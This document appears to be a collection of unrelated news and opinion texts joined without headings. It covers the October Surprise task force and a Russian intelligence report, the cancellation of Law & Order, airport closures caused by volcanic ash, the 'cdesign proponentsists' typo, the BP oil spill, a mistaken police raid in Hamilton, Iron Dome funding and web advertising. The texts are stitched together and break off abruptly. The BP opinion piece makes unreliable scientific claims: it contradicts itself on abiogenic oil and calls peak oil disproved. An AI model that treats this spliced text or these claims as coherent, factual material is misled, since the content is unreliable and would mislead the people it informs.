Both the Reagan - Bush Republicans and the Carter Democrats “ started from the proposition that Imam Khomeini , having announced a policy of ‘ neither the West nor the East , ’ and cursing the ‘ American devil , ’ imperialism and Zionism , was forced to acquire American weapons , spares and military supplies by any and all possible means , ” the Russian report said .
According to the Russians , the Republicans won the bidding war .
“ After the victory of R. Reagan in the election , in early 1981 , a secret agreement was reached in London in accord with which Iran released the American hostages , and the U.S. continued to supply arms , spares and military supplies for the Iranian army , ” the Russian report continued .
The deliveries were carried out by Israel , often through private arms dealers , the Russian report said .
[ For text of the Russian report , click here .
To view the U.S. embassy cable that contains the Russian report , click here . ]
The Russian report came in response to an Oct. 21 , 1992 , query from Hamilton , who asked the Russian government what its files might show about the October Surprise case .
The report came back from Sergey V. Stepashin , chairman of the Supreme Soviet ’s Committee on Defense and Security Issues , a job roughly equivalent to chairman of the Senate Intelligence Committee .
In what might have been an unprecedented act of cooperation between the two longtime enemies , Stepashin provided a summary of what Russian intelligence files showed about the October Surprise charges and other secret U.S. dealings with Iran .
In the 1980s , after all , the Soviet KGB was not without its own sources on a topic as important to Moscow as developments in neighboring Iran .
The KGB had penetrated or maintained close relations with many of the intelligence services linked to the October Surprise allegations , including those of France , Spain , Germany , Iran and Israel .
History had shown , too , that the KGB had spies inside the CIA and other U.S. intelligence agencies .
So , Soviet intelligence certainly was in a position to know a great deal about what had or had not happened in 1980 .
The Supreme Soviet ’s response was delivered to the U.S. Embassy in Moscow by Nikolay Kuznetsov , secretary of the subcommittee on state security .
Kuznetsov apologized for the “ lengthy preparation of the response . ”
It was quickly translated by the U.S. embassy and forwarded to Hamilton .
Lost Report However , if the recollections of Hamilton and Barcella are correct , the report may never have reached Hamilton , instead being intercepted by Barcella who had previously acknowledged to me that he decided to simply file the report away in boxes containing the task force documents .
After I discovered the Russian report in one of those boxes in late 1994 , I failed to get a response to questions I placed with Hamilton ’s congressional staff .
Back then , Hamilton was a powerful figure in Congress , transitioning from being chairman of the House Foreign Affairs Committee to being the panel ’s ranking Democrat .
Years later , in 2004 , while working on the book Secrecy & Privilege , I managed to get Barcella on the phone to ask him why the task force had n’t at least released the Russian report along with the final task force report which had reached a contradictory conclusion .
Barcella explained that the Russian report had arrived late and its classification , as “ confidential , ” meant that it could n’t simply be made public .
Instead he said he filed it away , assuming it would disappear into some vast government warehouse , “ like in the movie ‘ Raiders of the Lost Ark . ’ ”
In that interview , Barcella also acknowledged that new evidence implicating the Republicans in the October Surprise intrigue arrived in December near the end of the investigation , leading him to ask Hamilton to extend the investigation for a few more months so the new material could be evaluated , but that Hamilton refused .
However , the task force report – released on Jan. 13 , 1993 – reflected none of that uncertainty , as it attacked various witnesses who claimed knowledge of the secret Republican - Iranian contacts .
The task force claimed to have established solid alibis for the whereabouts of Bill Casey and other key Republicans on dates of alleged meetings with Iranians .
In my view , many of the task force ’s alibis and other key findings were misleading or downright false .
[ For details , see Secrecy & Privilege . ]
However , in 1993 , Washington ’s conventional wisdom was that the October Surprise story was a bogus conspiracy theory , despite the fact that many of the same Reagan figures had been caught lying about the secret Iran - Contra guns - for - hostages negotiations in 1985 - 86 .
Back on the Radar The October Surprise case popped back onto my radar in late February 2010 while I was traveling in Los Angeles .
I received an e-mail from one of the former task force members , ex- Rep. Mervyn Dymally , D - California .
Since we were both in Los Angeles , I suggested meeting for breakfast , which we did .
Dymally said he was pulling together some of his papers and was surprised to learn that Hamilton and task force vice chairman , Republican Henry Hyde , had forwarded the task force report to House Speaker Thomas Foley with a letter indicating that there had been a unanimous vote approving the debunking findings on Dec. 10 , 1992 .
Dymally said he never voted to approve the findings and indeed tried to submit a dissent to the final report , only to face resistance from Hamilton and Barcella .
Dymally added that Hamilton called him in January 1993 , demanding that the dissent be withdrawn .
“ If it were the case [ that there had been a unanimous vote on Dec. 10 , 1992 ] , why call me in January and talk to me about the dissent , ” Dymally said .
“ I did n’t know of any meeting on the tenth . ”
Dymally ’s dissent letter had protested some of the absurd alibis that Barcella and the task force were using to establish Casey ’s whereabouts on key dates .
For instance , the task force claimed that because someone had written down Casey ’s home phone number on one day that proved Casey was at home , and that because a plane flew from San Francisco directly to London on another date , Casey must have been onboard .
According to sources who saw Dymally ’s dissent , it argued that “ just because phones ring and planes fly does n’t mean that someone is there to answer the phone or is on the plane . ”
But Barcella reportedly was furious over the prospect of a dissent and enlisted Hamilton to pressure Dymally into withdrawing it .
In an interview with me back in 1993 , Dymally , who had just retired from Congress , said the day his dissent was submitted , he received a call from Hamilton warning him that if the dissent was not withdrawn , “ I will have to come down hard on you . ”
The next day , Hamilton , who was taking over the House Foreign Affairs Committee , fired the staff of the Africa subcommittee that Dymally had headed .
The firings were billed as routine , and Hamilton told me back then that “ the two things came along at the same time , but they were not connected in my mind . ”
Hamilton said his warning to Dymally had referred to a toughly worded response that Hamilton would have fired off to Dymally if the dissent had stood .
Hoping to salvage the jobs of some of his staff , Dymally agreed to withdraw the dissent .
However , Dymally told me at our Los Angeles breakfast that he never approved the report and was certainly not onboard for a unanimous vote on Dec. 10 , 1992 , which came more than a month after Congress had adjourned in that election year .
Russian Mystery
I also asked Dymally if he had known of the Russian report or the other late - arriving evidence that had supposedly led Barcella to recommend an extension of the task force investigation .
Dymally said he knew of neither .
Because of Dymally ’s dispute about the unanimous vote , I began contacting other ex-task force members to plumb their recollections .
I tracked down two former congressmen who had served on the task force , Edward Feighan and Sam Gejdenson .
Neither had a clear recollection of the vote , but were stumped when asked about the Russian report and Barcella ’s proposed extension .
One Democratic congressional staffer who had served on the investigation told me that interest in the October Surprise inquiry faded quickly after the November 1992 election when Democrat Bill Clinton defeated President George H.W.
Bush in his bid for a second term .
The focus of Official Washington turned to staffing the new administration , he said .
The Washington Establishment also had a great fondness for the departing President , so there was a feeling that pursuing old scandals that might implicate him in wrongdoing would be excessive .
Incoming President Clinton also wanted to focus the Democrats on gaining as much bipartisan goodwill for his agenda as possible .
When I first spoke with Hamilton recently , he said his memory also was foggy regarding the events of the early 1990s , including the circumstances surrounding the supposedly unanimous vote by task force members .
But he said he would not have claimed a unanimous vote if there had not been one .
Regarding Barcella 's claim that he had urged an extension of the investigation and that Hamilton had turned him down , Hamilton suddenly bristled .
“ That would have been an extraordinary development , ” Hamilton said , indicating that he would have remembered that .
“ We would not have closed an investigation if there was pending evidence . ”
When I asked Hamilton about the Russian report , he responded , “ none of that is ringing a bell with me . ”
I then e-mailed him a PDF file of the Russian report .
Barcella ’s Response I also contacted Barcella , who is now a lawyer in private practice at Paul , Hastings , Janofsky & Walker LLP .
He responded via e-mail , beginning with some personal insults : “ It 's sad that after so many years , you 're still obsessing over this .
It 's equally sad that you have insisted on one - sided interpretations and twisted characterizations of things .
Nonetheless , at the risk of feeding your quixotic obsession , here 's my best recollection , recognizing it is at best partial after nearly 2 decades .
“ The information from Russia came in literally at the last minute .
It 's [ sic ] source was unclear and needed verification .
The information was hardly self - authenticating and lacked detail .
Russia was in chaos in this immediate post - Soviet Union period and information and disinformation was spewing out like and uncapped oil well .
“ The Task Force report was either printed or at the printers .
The Task Force authorization was expiring or expired .
It was only authorized for that Congress and that congress had expired .
I spoke briefly w/ Lee [ Hamilton ] and do n't recall whether I showed him the Russian report or not .
“ He felt ham - strung , as there was a new Congress , a new ( and Democratic ) President , a new Administration and new priorities and nothing could be done w/o a whole new re-authorization process .
The original authorization had been very acrimonious and had taken weeks and weeks .
“ He was n't sure there was any stomach for fighting for re-authorization , particularly given the thoroughness of the investigation and confidence in the results .
There 's no doubt in my mind that if It were up to Lee , he would have given me the green light .
“ The realist in him knew that the House leadership was n't going to break their pick on a re-authorization fight . ”
Hamilton , however , told me that he had no recollection of any such re-authorization request from Barcella .
After receiving the PDF file of the Russian report , Hamilton also reiterated that he had no recollection of having ever seen it before , nor did his staff aide on the task force , Michael Van Dusen .
Barcella ’s contention in his e-mail about “ the thoroughness of the investigation and confidence in the results ” is also open to question .
On Dec. 8 , 1992 , recognizing the report ’s shaky conclusions , Barcella ordered his deputies “ to put some language in , as a trap door ” in case later disclosures disproved parts of the report or if complaints arose about selective omission of evidence .
[ For the “ trap door ” memo , click here . ]
After the trap - door memo , more late - arriving evidence implicated the Reagan campaign , but that material was either shoved aside or misrepresented in the final report .
For instance , a detailed letter from former Iranian president Abolhassan Bani-Sadr – dated Dec. 17 , 1992 , and describing his first - hand account of internal battles with Ayatollah Ruhollah Khomeini over whether to conspire with the Republicans – was dismissed as “ hearsay ” that lacked probative value .
The next day , Dec. 18 , 1992 , David Andelman , the biographer of French intelligence chief Alexandre deMarenches , gave sworn testimony about what deMarenches had confided to him about the Republican - Iranian contacts .
Andelman , an ex-New York Times and CBS News correspondent , said that while he was working on deMarenches ’s autobiography , the arch - conservative spymaster admitted arranging meetings between Republicans and Iranians about the hostage issue in the summer and fall of 1980 , with one meeting held in Paris in October .
Andelman said deMarenches ordered that the secret meetings be kept out of his memoirs because the story could otherwise damage the reputations of his friends , William Casey and George H.W. Bush .
Andelman ’s testimony corroborated longstanding claims from a variety of international intelligence operatives about a Paris meeting involving Casey and Bush .
But the task force report brushed this testimony aside , too , paradoxically terming it “ credible ” but then claiming it was “ insufficiently probative . ”
The report argued that Andelman could not “ rule out the possibility that deMarenches had told him he was aware of and involved in the Casey meetings because he , deMarenches , could not risk telling his biographer he had no knowledge of these allegations . ”
More Corroboration
Yet , besides corroborative testimony from intelligence operatives , such as Israeli intelligence officer Ari Ben-Menashe and several members of French intelligence , Barcella also was aware of a contemporaneous account of the alleged Bush - to - Paris trip by Chicago Tribune reporter John Maclean .
Maclean , the son of author Norman Maclean who wrote A River Runs Through It , had said a well - placed Republican source told him in mid-October 1980 about Bush ’s secret trip to Paris to meet with Iranians on the hostage issue .
That evening , Maclean passed on the information to David Henderson , a State Department Foreign Service officer who later recalled the date as Oct. 18 , 1980 .
At the time , Maclean did n’t write about the Bush - to - Paris leak because , he told me , a Reagan - Bush campaign spokesman subsequently denied it and Maclean did n’t have additional corroboration at that time .
The Maclean - Henderson recollection only bubbled to the surface in the early 1990s when the October Surprise investigation began .
Henderson mentioned the meeting in a 1991 letter to a U.S. senator that was forwarded to me while I was working for PBS Frontline .
In the letter , Henderson recalled the conversation about Bush ’s trip to Paris but not the name of the reporter .
A Frontline producer searched some newspaper archives to find a story about Henderson as a way to identify Maclean as the journalist who had interviewed Henderson .
Though not eager to become part of the October Surprise story in 1991 , Maclean confirmed that he had received the Republican leak on or about Oct. 18 , 1980 , precisely the time frame when Bush was alleged to have made a quick trip to Paris .
Despite the mounting evidence that the Republicans indeed had made secret contacts with Iranians in 1980 , the task force kept refusing to rethink its conclusions .
Instead , to debunk the October Surprise suspicions , the task force relied on supposed alibis for Casey and Bush , but the investigators knew how shaky the alibis were .
The alibis included the one about Reagan ’s foreign policy adviser Richard Allen writing down Casey ’s home phone number , which was interpreted as solid evidence that Casey must have been at home , even though Allen had no recollection of calling Casey and no record of any call .
Other alibis were equally false or flimsy .
[ See Consortiumnews.com ’s “ The Crazy October Surprise Debunking . ” ]
Barcella ’s Game Now , with Barcella ’s claim that he urged Hamilton to extend the investigation so the late - arriving evidence could be thoroughly vetted , the former chief counsel seems to be playing a double game , acknowledging that he was concerned about the fragility of the report ’s conclusions while still insisting that the debunking was airtight .
The fact that Barcella and Hamilton now differ on the question of whether Barcella requested an extension – and their apparent agreement that Barcella never showed the Russian report to Hamilton – suggests that Barcella may have decided to sink the October Surprise suspicions for his own reasons .
That also might explain Barcella ’s touchiness over the case being brought back up again .
Barcella always seemed to be an odd choice for chief counsel , although he volunteered for the October Surprise job in 1991 and at the time had a reputation as a tough prosecutor because of his work in the 1980s capturing “ rogue ” CIA operative Edwin Wilson , who was subsequently convicted of selling explosives and other military items to Libya .
However , Barcella had apparent conflicts of interest , including a friendship with neoconservative operative Michael Ledeen , who had been a key figure in the Iran - Contra scandal and was linked as well to the October Surprise case .
For instance , an early draft of the task force report had identified Ledeen and another prominent neocon Richard Perle as participating in meetings of the Reagan campaign ’s “ October Surprise Group , ” though “ they were not considered ‘ members . ’ ”
The campaign ’s “ October Surprise Group ” was assigned the task of preparing for “ any last - minute foreign policy or defense - related event , including the release of the hostages , that might favorably impact President Carter in the November election , ” the draft report said .
The draft also mentioned a Sept. 16 , 1980 , meeting on something called the “ Persian Gulf Project ” involving senior campaign officials , including William Casey and Richard Allen .
According to the draft and Allen ’s notes , Ledeen also participated in that meeting .
However , both references to Ledeen were removed from the task force ’s final report , apparently after Ledeen spoke with his friend Barcella .
[ To read portions of the draft report , click here . ]
“ Yes , I believe I spoke to Larry Barcella about the October Surprise investigation , ” Ledeen told me in an e-mail exchange last year .
“ And I undoubtedly told him what I have always said , namely that , to the best of my knowledge , the October Surprise theory is nonsense . ”
The Barcella - Ledeen relationship dates back several decades when Barcella sold a house to Ledeen and the two aspiring Washington professionals shared a housekeeper .
According to Peter Maas ’s book Manhunt about Barcella ’s work as a prosecutor on the Wilson case , Ledeen approached Barcella regarding the investigation in 1982 .
Ledeen , then a State Department consultant on terrorism , was concerned that two of his associates , former CIA officer Ted Shackley and Pentagon official Erich von Marbod , had come under suspicion in the Wilson case .
“ I told Larry that I ca n’t imagine that Shackley [ or von Marbod ] would be involved in what you are investigating , ” Ledeen told me in an interview years later .
“ I was n’t trying to influence what he [ Barcella ] was doing .
This is a community in which people help friends understand things . ”
Barcella also saw nothing wrong with the out - of - channel approach .
“ He was n’t telling me to back off , ” Barcella told me .
“ He just wanted to add his two - cents worth . ” Barcella said the approach was appropriate because Ledeen “ was n’t asking me to do something or not do something . ”
However , Shackley and von Marbod were dropped from the Wilson investigation .
Ledeen ’s associate , Shackley , also had a connection to the October Surprise case in 1980 , having worked with then - vice presidential candidate George H.W. Bush on the Iran hostage issue .

The Collapsing Case on Wilson Barcella ’s golden reputation from the Wilson conviction also has been tarnished in recent years .
In 2003 , an irate federal judge threw out Wilson ’s Libya conviction after learning that the U.S. government had lied in a key affidavit which denied that Wilson was in contact with the CIA regarding his work with the Libyans .
The government ’s false affidavit , which disputed Wilson ’s defense claim that he had been cooperating with the CIA , was read twice to the jury before it returned the guilty verdict in 1983 .
Jury foreman Wally Sisk has said that without the government ’s affidavit , the jury would not have convicted Wilson .
“ That would have taken away the whole case of the prosecution , ” Sisk said .
The discovery of this prosecutorial abuse – after Wilson had been imprisoned for two decades – led U.S. District Judge Lynn N. Hughes to vacate Wilson ’s conviction for selling military items to Libya .
“ There were , in fact , over 80 contacts , including actions parallel to those in the charges , ” Hughes wrote in his decision .
“ The government discussed among dozens of its officials and lawyers whether to correct the testimony .
No correction was made , ” until Wilson managed to pry loose an internal memo describing the false affidavit and revealing the debate among government officials about whether to correct it .
In an interview with ABC ’s “ Nightline , ” Wilson called Barcella and another prosecutor “ evil ” for their role in the deception .
“ Once they got me convicted , then they had to cover this thing up constantly , ” Wilson said .
“ They wanted to make sure that I would never get out of prison . ”
Barcella , who was the supervising prosecutor in the Wilson case , has said he does n’t recall seeing the affidavit before it was introduced and has denied any impropriety afterwards , when other government officials challenged the affidavit ’s accuracy .
While the Wilson reversal dimmed Barcella ’s standing , Hamilton ’s reputation remains glittering , at least as far as Official Washington is concerned .
After retiring from Congress in 1999 , he became president of the Woodrow Wilson International Center for Scholars .
Considered a Washington Wise Man by many , he has served on blue - ribbon panels in recent years , including the 9/11 Commission and the Iraq Study Group .
Now , the question is whether Hamilton will insist that his task force ’s certainty regarding its October Surprise debunking be reconsidered in light of the new evidence – or whether he ’ll assume that it ’s smarter to keep quiet and trust that Washington ’s misguided conventional wisdom will continue to hold .

After record 20 seasons , “ Law and Order ” was finally canceled by NBC .
The last episode will be aired on May 24 .
But Law and Order : Special Victims Unit ( SVU ) and Law and Order : Los Angeles will continue for another season .
It is an interesting cancelation because with one more season , the show could have surpassed Gunsmoke to be the longest lasting TV series .
Law & Order is practically an American monument .
One of the cast members , Fred Thompson , ran for President .
Two other cast members – the late Jerry Orbach and Sam Waterston – have become national treasures .
It ’s a rite of passage for actors in New York to appear on the show or its spinoffs .
To me , real - world scandals only felt really real when they appeared as a plotline on Law & Order .

About Law and Order ( from here )
Law & Order is an American police procedural and legal drama television series , created by Dick Wolf , that airs on NBC .
Law & Order premiered on September 13 , 1990 , and is currently in its twentieth season , which began airing on September 25 , 2009 .
Law & Order is currently the longest running crime drama on American prime time television and is tied for longest running drama of all time with Gunsmoke .
Set and filmed in New York City , the series follows a two part approach : in the first half hour , the investigation of a crime and apprehension of a suspect by New York City police detectives is shown , followed by the prosecution of the offenders by the Manhattan District Attorney ‘s office in the second half .
Plots are often based on real cases that have recently made headlines .
The show has been noted for its revolving cast over the years .
It currently stars Jeremy Sisto as Detective Cyrus Lupo , Anthony Anderson as Detective Kevin Bernard , Linus Roache as Executive Assistant District Attorney Michael Cutter , and Alana de la Garza as Assistant District Attorney Connie Rubirosa .
The success of the series has led to the creation of additional shows within the Law & Order franchise , a television film , several video games , and international adaptations of the series .
It has won and been nominated for numerous awards over the years , including a number of Emmys .
History and development
In 1988 , Dick Wolf developed a concept for a new television series that would depict a relatively optimistic picture of the American justice system .
He initially toyed with the idea of calling it Night & Day but then hit upon the title Law & Order .
For the first half of each episode , the show would follow two detectives and their commanding officer as they investigate a violent crime .
The second half of the show would center around the District Attorney ’s Office and the courts as three prosecutors attempt to convict the criminal .
Through this , Law & Order would be able to investigate some of the larger issues of the day by focusing on stories that were based on real cases making headlines .
Wolf took the idea to then - president of Universal Television Kerry McCluggage , who pointed out the similarity to a 1963 series titled Arrest and Trial that lasted one season .
The two watched the pilot of that series , in which a police officer , played by Ben Gazzara , arrested a man for armed robbery in the first half , and the defense attorney , played by Chuck Connors gets the perpetrator off as the wrong guy .
Wolf discovered this was the formula of the show every week , and decided that , while his detectives would occasionally be fallible as Gazzara ’s was , he wanted a fresh approach to the genre that would go from police procedural to prosecution with a greater degree of realism .
In addition , the prosecution would be the hero instead of the defense , a reversal of the usual formula in lawyer dramas .
Initially , the show was ordered by Fox for thirteen episodes with no pilot based on the concept alone .
The decision was reversed by then - network head Barry Diller , who loved the idea but did not believe it was a Fox show .
Wolf then went to CBS , which ordered a pilot , “ Everbody ’s Favorite Bagman ” , written by Wolf , which centered around corrupt city officials involved with the mob .
The network liked the pilot but did not order it because there were no breakout stars in the show .
In the summer of 1989 , NBC ’s top executives , Brandon Tartikoff and Warren Littlefield , screened the pilot and liked it , but were concerned the intensity of the series could not be repeated on a week by week basis .
However , there was enough faith from executives that the series was innovative and could appeal to a wide audience that the series was ordered by NBC for a full season in 1990 .
Could we have taken more of Law and Order ?
For me – yes , but I am a bigger fan of SVU than the current Law and Order .

The busiest and second - busiest airports in the United Kingdom are both closed for the night .
The closures are due to renewed concern about the levels of ash in the air , from the continued eruption of Eyjafjallajökull , the volcano in south - central Iceland whose eruption brought all commercial air traffic in Europe to a standstill for several days last month .
These closures will follow a day of frustration for many air travelers in North West England , where Manchester and Liverpool each closed its own major airport today .
The ash cloud is estimated to move south and settle in over Greater London during Monday and Tuesday .
It is estimated the ash cloud will have moved on through London by Wednesday .
The United Kingdom ’s two busiest airports , Heathrow ( IATA : LHR ; ICAO : EGLL ) , and Gatwick ( IATA : LGW ; ICAO : EGKK ) are scheduled to be closed from 1:00 Monday morning to 7:00 Monday morning local time ( 8:00 Sunday evening to 2:00 Monday morning , EDT ) .
Officials at both airports advise travelers who are scheduled to fly during the night to contact their airline for further information .
London City Airport ( IATA : LCY ; ICAO : EGLC ) the one nearest to the center of The Metropolis , reports that London airspace is entirely closed from midnight to 6:00 Monday morning , local time .
Suburban Luton Airport ( IATA : LTN ; ICAO : EGGW ) does not give any indication that it intends to close at this time .
Suburban Stansted Airport ( IATA : STN ; ICAO : EGSS ) also does not yet plan to close .
But all advise air travelers to keep close contact with the operating airlines of their flights for updates .

“ ” Evolutionists think the former is correct , cdesign proponentsists accept the latter view .
— Of Pandas and People , 1987 draft version .
The term " cdesign proponentsists " came into being following the Kitzmiller v. Dover Area School District trial in Pennsylvania over the legitimacy of teaching intelligent design as science .
A crucial piece of the defense ( pro-intelligent design ) was a book called Of Pandas and People which was marketed as a science textbook for middle and high school children .
During the trial , previous copies of the book were subpoenaed for review .
It was demonstrated that , whenever previous versions of the book had the terms " creationist " or " creationism " or some similar form , it had been replaced in almost all cases with the terms " design proponents " and " intelligent design " in later editions .
Example from the trial [ edit ]
Example of earlier creationist edition ( emphasis added ) :
" Creation means that the various forms of life began abruptly through the agency of an intelligent creator with their distinctive features already intact .
Fish with fins and scales , birds with feathers , beaks , and wings , etc . "
Example of new Improved Intelligent Design edition ( emphasis added ) :
" Intelligent design means that various forms of life began abruptly through an intelligent agency , with their distinctive features already intact .
Fish with fins and scales , birds with feathers , beaks , wings , etc . "
This evidence and things like the Wedge Document helped lead John E. Jones III to his verdict that intelligent design was the same as creationism and that the ID movement was a subversive attempt to inject creationism into the classroom .
cdesign proponentsists [ edit ]
Of Pandas and People , 1987 draft .
Page 3 - 41 from , 1987 draft .
Use of the terms " creationism " versus " intelligent design " in sequential editions of the book under its various titles .
In the leadup to the Dover Trial , the plaintiff lawyers subpoenaed the Texas - based Foundation for Thought and Ethics ( publishers of Of Pandas and People ) for all draft versions of the textbook .
They received copies of all draft versions , including those created in 1987 when the Edwards v. Aguillard case was decided ( making it unlawful to teach creationism in public schools ) .
Examination of various draft versions of Of Pandas and People from 1987 showed that after the Supreme Court 's decision in Edwards v. Aguillard , all references to " creationism " were replaced with alternate terms .
A particular sentence in an early 1987 draft read as follows :
The basic metabolic pathways ( reaction chains ) of nearly all organisms are the same .
Is this because of descent from a common ancestor , or because only these pathways ( and their variations ) can sustain life ?
Evolutionists think the former is correct , creationists accept the latter view .
In one particular draft dated to after the Edwards decision , an editor had apparently copied and pasted " design proponents " over the word " creationists " .
However in doing so had pasted over only part of the latter , resulting in a weird neologism , " cdesign proponentsists " . [ 1 ] [ 2 ]
The basic metabolic pathways ( reaction chains ) of nearly all organisms are the same .
Is this because of descent from a common ancestor , or because only these pathways ( and their variations ) can sustain life ?
Evolutionists think the former is correct , cdesign proponentsists accept the latter view .
This typo has been mocked by some as the missing link between creationism and intelligent design , notably ironic considering creationists do n't accept transitional forms .
It 's possibly this aspect alone that has promoted the meme to be as famous as it is .
If they 'd consistently used " Find and Replace " [ 3 ] properly , then this would n't have happened .
A new meme [ edit ]
The story has now been promoted to " Internet legend " status , and one can now find versions of this story which claim :
That every instance of the word " creationist " was changed to " Cdesign proponentsists " .
In fact only one word was changed in this way ; the rest were " correctly " changed .
That this particular error was brought up during the trial .
It was not , as this transcript shows .
[ 4 ]
The discovery was discussed at length in the PBS NOVA documentary about the Dover case entitled Judgment Day : Intelligent Design on Trial .
That discussion is possibly what led to the misconception that the discovery of the error was actually presented as evidence during the Dover Trial .
NCSE - cdesign proponentsists - tracking the instances of " creationist " to " cdesign proponentsists " through versions .

It does n’t matter what President Obama says from the Oval Office Tuesday evening .
He can lay out all manner of things that BP must do in the wake of what is shaping up to be a major ecological disaster , but he and Congress are also working to put a cap on BP ’s financial liability .
Both know that this leak will ultimately cost upwards of a trillion dollars or more to ameliorate .
It ’s not that BP is n’t liable for the leak , but rather that it had the great , good fortune to tap what in the oil industry are called “ elephants ” , discoveries of huge multi-million barrel reserves .
It had the bad fortune to have the huge rig blow up and a leak so far down only robots can attempt to shut it off .
What one rarely hears about are the “ dry ” holes that oil companies drill .
They do n’t make news , but they spell disaster for an oil company that does it too many times .
As Tom Bower says in his timely new book , “ Oil : Money , Politics , and Power in the 21st Century ” .
“ In recent years , dry holes had wrecked major oil companies .
The skeletons of Gulf , Texaco , Arco and other past icons mercilessly testified that only the fittest and bravest survived . ”
The amount of investment in a single hole is significant .
When that hole is in deep water , a billion dollars can be spent at a rate of hundreds of thousands a day to rent a rig .
Naturally , the oil companies use every form of technology available to geologists to decide where to drill , but even then it is a high risk gamble .
To cite one BP gamble , when in 1969 Arco drilled in Alaska it only found non-commercial gas .
BP geologist , Jim Spence , concluded the oil was closer to the rim of a potential reservoir instead of its “ sweet spot . ”
The result saved BP .
The company then put its chips on the Gulf of Mexico .
It became the largest acreage - holder and owned a third of all the oil discovered there .
All the major oil companies knew that the Gulf of Mexico represented a treasure of oil , but it was BP that rolled the dice the most .
In 2005 , one deep water rig called Thunder Horse was nearly ready when Hurricane Dennis hit the Gulf and it had to be abandoned .
When the engineers returned , they found flaws in some of its valves .
In hindsight , it foretold the problems encountered by the Deepwater Horizon .
The irony was that BP ’s latest discovery was the mother lode of oil reservoirs .
Vladimir Kutcherov is a Russian specialist in the theory of the abiogenic deep origin of oil , the view that it is not created from the activity of living organisms ; that oil is the result of dead dinosaurs .
Oil , it would appear , is created deep within the Earth .
Kutcherov believes that BP drilled into “ a migration channel ” , a deep fault on which hydrocarbons generated in the depth of the planet migrate to the crust .
The other irony is that the BP disaster should put an end to the widely disseminated “ peak oil ” theory that says the Earth is running out of oil .
If Kutcherov is right — and I think he is — that means the “ hole ” that President Obama and BP wants “ plugged ” is comparable to trying to plug a volcano .
The effort could take months , if not years .
That is why whatever President Obama tells Americans and the rest of the world is probably going to be something far less than the truth .
Obama faces some fearful political consequences no matter what he says .
BP is heavily invested in America .
It employs several thousand .
It pays huge royalties .
Many British pensioners depend on its dividends as do other investors .
The unions to which Obama owes much for his election are resistant to allowing non-union workers to help protect against the growing spill affecting Louisiana , Mississippi , Alabama , and Florida .
The spill also threatens to reveal how closely associated BP was with many leading environmental organizations .
As F. William Engdahl , the author of “ A Century of War : Anglo - American Oil Politics and the New World Order ” , points out in a June 11th Global Research commentary , “ ” The deafening silence of leading green or ecology organizations such as Greenpeace , Nature Conservancy , Sierra Club and others may well be tied to a money trail that leads right back to the oil industry , notably to BP . ”
“ Leading environmental organizations have gotten significant financial payoffs in recent years from BP in order that the oil company could remake itself with an ‘ environmentally friendly face ’ , as in ‘ beyond petroleum ’ , the company ’s new branding . ”
Among those groups have been the Nature Conservancy , Conservation International , the Environmental Defense Fund , Sierra Club , and Audubon .
The drive to drill in deep waters off shore was in part driven by the resistance by environmental organizations to doing so far more safely on land .
The refusal to allow drilling in Alaska ’s ANWR is a glaring example .
The fact that oil companies began decades ago to look far afield of the U.S. and its forbidden offshore reserves of oil is another .
A president who has already managed to destroy whatever popularity he had when he took office a scant year and a half ago is not likely to survive the BP disaster no matter what he says or does .
All Americans must be especially watchful for an effort by Obama to impose what was called “ Cap - and - Trade ” , then called a “ climate ” bill , and now is touted as a “ Jobs ” bill .
It will require a major effort to thwart the Senate from signing yet another suicidal piece of legislation that would impose huge taxes on all energy use .
As always , Mother Nature will have the final word .

Hamilton 's police chief admits they got the wrong apartment and the wrong man when officers burst into the home of an unsuspecting refugee from Myanmar who was left terrified and bloodied .
Heavily armed officers were looking for an alleged cocaine dealer who lives in a different unit in the same apartment building as 58 - year - old Po La Hay and his two adult children .
Hay was home around 9 p.m.
Tuesday readying things for work the next day at a garden centre when he claims police broke down his door and aimed guns at his head .
" I did n't even have a chance to say any words , " he said through interpreter Lerwah Lobo .
Terrified ,
Hay collapsed to the ground .
Officers handcuffed him and asked if he was the man listed on their warrant , he said .
When he said , " No , my name is Po La , " Hay claims officers smashed his face on the floor and began kicking him .
He was scared to move , believing they might be robbers despite the uniforms .
Telling the story , Hay smiles politely and shakes a little .
He has stitches above his left eye , a bruised and bloodied nose and red marks along his back and side .
He said one rib is broken and he will have to return to doctors for more tests .
He looks less than 100 pounds .

The latest Israeli missile defense request comes amid a policy by the Obama administration to deny offensive weapons to the Jewish state .
Over the last 16 months , Obama has either rejected or withheld approval for Israeli procurement or upgrades of such platforms as attack helicopters .
Israel has received $ 2.55 billion in defense aid in 2010 .
Officials said the administration of U.S. President Barack Obama has approved $ 205 million for the Israeli procurement of at least 10 Iron Dome batteries .
They said the U.S. assistance for the Israeli - origin Iron Dome short - range missile and rocket defense system would be secured over the next few weeks in talks by visiting Israeli Defense Ministry director - general Udi Shani .
" The United States and our ally Israel share many of the same security challenges , from combating terrorism to confronting the threat posed by Iran 's nuclear - weapons program , " White House spokesman Tommy Vietor said on May 13 .
" The president recognizes the threat missiles and rockets fired by Hamas and Hizbullah pose to Israelis . "
In April , Israeli Defense Minister Ehud Barak discussed missile and rocket defense with the administration .
Officials said Barak asked Defense Secretary Robert Gates for U.S. help to bolster the Jewish state 's multi-layered rocket and defense system with funds for development and procurement .
" Not a week goes by when there is no security - related interaction [ between Israel and the United States ] , " Israeli Deputy Chief of Staff Maj.
Gen. Benny Gantz said .
One proposal stipulated U.S. funding for Israel to produce and procure Iron Dome , scheduled for initial deployment in mid-2010 .
The Israeli Finance Ministry has allocated funding for two Iron Dome systems , but the military has set a requirement for another dozen batteries for protection of northern and southern Israel from Hamas and Hizbullah missiles and rockets .
" This funding will expand what they can produce and deploy , and how quickly they 're able to do it , " Pentagon spokesman Bryan Whitman said on May 13 .
The Pentagon has been lobbied by at least one U.S. defense major for joint production of Iron Dome .
The U.S. company was identified as Raytheon , the leading U.S. missile producer and Israel 's partner in the David 's Sling tactical missile defense system .
" The ideal would be a project that would produce Iron Dome for both the U.S. and Israeli militaries , with the prospect of upgrades , but the Americans are not interested in acquiring Iron Dome , " the official said .
In April 2010 , the administration approved the launch of the first major military project for Israel under Obama .
The Pentagon awarded Lockheed Martin a $ 98 million contract for one C - 130J air transport to Israel .
The Israeli request was approved by then - President George W. Bush in mid-2008 .
On May 17 , the Pentagon awarded its second defense contract for Israel under the Obama administration .
The $ 20 million contract called for an engine upgrade of an Israeli armored personnel carrier that had been deployed in the 2009 war in the Gaza Strip .
" This [ U.S. refusal to supply weapons to Israel ] will become a major problem over the next few months , " another official said .
Giving web services away for free in exchange for ad supported revenue has been the de facto standard for most web 2.0 properties .
While the concept works great for Google and a small number of web services , it does not work for the majority of web services .
The ad revenues are just not enough to support a legitimate business .
